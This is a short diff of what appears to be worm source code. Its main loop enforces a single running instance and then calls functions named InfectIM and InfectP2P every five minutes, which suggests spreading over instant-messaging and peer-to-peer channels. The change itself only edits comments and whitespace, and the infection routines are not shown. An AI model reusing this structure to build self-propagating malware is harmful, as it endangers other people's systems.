@@ -82,12 +82,11 @@ int main()
     if (GetLastError() == ERROR_ALREADY_EXISTS)
         ExitProcess(0);
 
-
     while (true)
     {
-        InfectIM();
+        InfectIM(); // +2
 
-        InfectP2P();
+        InfectP2P();// +13
 
         Sleep(1000*300);
     }
